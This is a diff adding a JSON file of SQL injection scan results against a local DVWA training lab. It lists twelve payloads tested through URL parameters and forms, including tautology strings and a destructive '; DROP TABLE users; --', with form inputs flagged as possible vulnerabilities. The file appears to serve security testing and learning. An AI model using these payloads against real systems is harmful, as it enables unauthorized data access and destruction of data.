@@ -1,0 +1,74 @@
+[
+    {
+        "url": "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%27",
+        "payload": "'",
+        "type": "url",
+        "status": "safe"
+    },
+    {
+        "url": "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%27%20OR%20%271%27%3D%271",
+        "payload": "' OR '1'='1",
+        "type": "url",
+        "status": "safe"
+    },
+    {
+        "url": "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%22%20OR%20%221%22%3D%221",
+        "payload": "\" OR \"1\"=\"1",
+        "type": "url",
+        "status": "safe"
+    },
+    {
+        "url": "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%27%20OR%20%271%27%3D%271%27%20--%20",
+        "payload": "' OR '1'='1' -- ",
+        "type": "url",
+        "status": "safe"
+    },
+    {
+        "url": "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%27%20OR%20%27a%27%3D%27a",
+        "payload": "' OR 'a'='a",
+        "type": "url",
+        "status": "safe"
+    },
+    {
+        "url": "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit%27%3B%20DROP%20TABLE%20users%3B%20--",
+        "payload": "'; DROP TABLE users; --",
+        "type": "url",
+        "status": "safe"
+    },
+    {
+        "url": "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit",
+        "payload": "'",
+        "type": "form",
+        "status": "possible_vulnerability"
+    },
+    {
+        "url": "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit",
+        "payload": "' OR '1'='1",
+        "type": "form",
+        "status": "possible_vulnerability"
+    },
+    {
+        "url": "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit",
+        "payload": "' OR '1'='1' -- ",
+        "type": "form",
+        "status": "possible_vulnerability"
+    },
+    {
+        "url": "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit",
+        "payload": "\" OR \"1\"=\"1",
+        "type": "form",
+        "status": "possible_vulnerability"
+    },
+    {
+        "url": "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit",
+        "payload": "' OR 'a'='a",
+        "type": "form",
+        "status": "possible_vulnerability"
+    },
+    {
+        "url": "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit",
+        "payload": "'; DROP TABLE users; --",
+        "type": "form",
+        "status": "possible_vulnerability"
+    }
+]
